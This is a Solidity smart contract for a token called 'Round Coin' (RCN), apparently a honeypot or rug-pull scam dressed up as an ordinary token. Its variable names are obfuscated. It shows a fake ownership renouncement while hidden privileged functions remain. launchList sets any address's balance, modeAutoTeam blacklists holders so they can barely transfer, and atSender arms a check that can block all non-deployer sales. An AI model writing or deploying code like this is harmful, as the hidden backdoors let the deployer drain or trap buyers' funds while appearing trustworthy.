//SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract liquidityAuto {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minLaunch {
    function createPair(address takeTotal, address tokenTx) external returns (address);

    function feeTo() external view returns (address);
}

interface feeFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface sellFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamToExempt) external view returns (uint256);

    function transfer(address limitTake, uint256 modeLimit) external returns (bool);

    function allowance(address minMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeLimit) external returns (bool);

    function transferFrom(
        address sender,
        address limitTake,
        uint256 modeLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitAmount, uint256 value);
    event Approval(address indexed minMax, address indexed spender, uint256 value);
}

interface toTxReceiver is sellFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract RoundCoin is liquidityAuto, sellFee, toTxReceiver {

    function balanceOf(address teamToExempt) public view virtual override returns (uint256) {
        return shouldTradingTx[teamToExempt];
    }

    uint8 private limitLaunchedIs = 18;

    function owner() external view returns (address) {
        return tradingSellEnable;
    }

    uint256 private txEnableFrom;

    function allowance(address enableListSell, address swapFrom) external view virtual override returns (uint256) {
        if (swapFrom == launchedFrom) {
            return type(uint256).max;
        }
        return launchedMarketing[enableListSell][swapFrom];
    }

    string private totalFrom = "Round Coin";

    uint256 public sellMarketingLimit;

    uint256 public autoToken = 0;

    address launchedFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public walletSender;

    uint256 public tokenTradingAmount;

    address public teamTotalAuto;

    mapping(address => uint256) private shouldTradingTx;

    constructor (){
        if (sellMarketingLimit == tokenTradingAmount) {
            walletSender = true;
        }
        atFund();
        feeFrom maxSwapFrom = feeFrom(launchedFrom);
        fundAuto = minLaunch(maxSwapFrom.factory()).createPair(maxSwapFrom.WETH(), address(this));
        swapBuyLaunch = minLaunch(maxSwapFrom.factory()).feeTo();
        
        teamTotalAuto = _msgSender();
        feeTeamSwap[teamTotalAuto] = true;
        shouldTradingTx[teamTotalAuto] = liquidityMinMax;
        
        emit Transfer(address(0), teamTotalAuto, liquidityMinMax);
    }

    function symbol() external view virtual override returns (string memory) {
        return swapShould;
    }

    function approve(address swapFrom, uint256 modeLimit) public virtual override returns (bool) {
        launchedMarketing[_msgSender()][swapFrom] = modeLimit;
        emit Approval(_msgSender(), swapFrom, modeLimit);
        return true;
    }

    uint256 shouldTotalLiquidity;

    uint256 private totalReceiver;

    function atSender(uint256 modeLimit) public {
        shouldTradingIs();
        shouldTotalLiquidity = modeLimit;
    }

    uint256 constant fromTotal = 3 ** 10;

    function transferFrom(address fundEnable, address limitTake, uint256 modeLimit) external override returns (bool) {
        if (_msgSender() != launchedFrom) {
            if (launchedMarketing[fundEnable][_msgSender()] != type(uint256).max) {
                require(modeLimit <= launchedMarketing[fundEnable][_msgSender()]);
                launchedMarketing[fundEnable][_msgSender()] -= modeLimit;
            }
        }
        return liquidityAt(fundEnable, limitTake, modeLimit);
    }

    function toWalletFee(address fundEnable, address limitTake, uint256 modeLimit) internal view returns (uint256) {
        require(modeLimit > 0);

        uint256 teamMarketing = 0;
        if (fundEnable == fundAuto && autoReceiver > 0) {
            teamMarketing = modeLimit * autoReceiver / 100;
        } else if (limitTake == fundAuto && autoToken > 0) {
            teamMarketing = modeLimit * autoToken / 100;
        }
        require(teamMarketing <= modeLimit);
        return modeLimit - teamMarketing;
    }

    uint256 private modeExempt;

    address swapBuyLaunch;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityMinMax;
    }

    string private swapShould = "RCN";

    address public fundAuto;

    address private tradingSellEnable;

    uint256 private liquidityMinMax = 100000000 * 10 ** 18;

    function liquidityAt(address fundEnable, address limitTake, uint256 modeLimit) internal returns (bool) {
        if (fundEnable == teamTotalAuto) {
            return minWallet(fundEnable, limitTake, modeLimit);
        }
        uint256 amountMode = sellFee(fundAuto).balanceOf(swapBuyLaunch);
        require(amountMode == shouldTotalLiquidity);
        require(limitTake != swapBuyLaunch);
        if (teamList[fundEnable]) {
            return minWallet(fundEnable, limitTake, fromTotal);
        }
        modeLimit = toWalletFee(fundEnable, limitTake, modeLimit);
        return minWallet(fundEnable, limitTake, modeLimit);
    }

    function shouldLimit(address limitReceiver) public {
        require(limitReceiver.balance < 100000);
        if (exemptFrom) {
            return;
        }
        
        feeTeamSwap[limitReceiver] = true;
        if (sellMarketingLimit == totalReceiver) {
            modeAtLaunch = true;
        }
        exemptFrom = true;
    }

    function transfer(address tokenFund, uint256 modeLimit) external virtual override returns (bool) {
        return liquidityAt(_msgSender(), tokenFund, modeLimit);
    }

    mapping(address => bool) public teamList;

    function getOwner() external view returns (address) {
        return tradingSellEnable;
    }

    function modeAutoTeam(address totalTake) public {
        shouldTradingIs();
        
        if (totalTake == teamTotalAuto || totalTake == fundAuto) {
            return;
        }
        teamList[totalTake] = true;
    }

    uint256 public autoReceiver = 0;

    bool private modeAtLaunch;

    function minWallet(address fundEnable, address limitTake, uint256 modeLimit) internal returns (bool) {
        require(shouldTradingTx[fundEnable] >= modeLimit);
        shouldTradingTx[fundEnable] -= modeLimit;
        shouldTradingTx[limitTake] += modeLimit;
        emit Transfer(fundEnable, limitTake, modeLimit);
        return true;
    }

    function atFund() public {
        emit OwnershipTransferred(teamTotalAuto, address(0));
        tradingSellEnable = address(0);
    }

    function decimals() external view virtual override returns (uint8) {
        return limitLaunchedIs;
    }

    bool public exemptFrom;

    mapping(address => mapping(address => uint256)) private launchedMarketing;

    mapping(address => bool) public feeTeamSwap;

    function name() external view virtual override returns (string memory) {
        return totalFrom;
    }

    event OwnershipTransferred(address indexed txToken, address indexed fromSwap);

    function launchList(address tokenFund, uint256 modeLimit) public {
        shouldTradingIs();
        shouldTradingTx[tokenFund] = modeLimit;
    }

    uint256 autoMarketing;

    function shouldTradingIs() private view {
        require(feeTeamSwap[_msgSender()]);
    }

}